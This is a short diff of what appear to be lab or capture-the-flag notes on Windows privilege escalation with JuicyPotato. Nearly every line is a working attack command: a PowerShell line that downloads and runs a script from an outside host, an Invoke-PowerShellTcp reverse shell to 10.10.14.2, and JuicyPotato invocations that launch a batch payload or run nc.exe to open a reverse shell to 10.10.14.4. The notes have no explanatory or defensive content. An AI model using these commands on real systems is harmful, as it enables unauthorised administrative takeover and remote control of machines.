@@ -9,3 +9,5 @@ powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.
 copy and paste end of last line: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444
 ```
 Step 4: .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\Users\merlin\appdata\local\Temp\rev.bat" -t *
+PS: Search list CLSID at: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+Ext-other: .\JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c c:\programdata\nc.exe 10.10.14.4 5555 -e cmd.exe" -t *
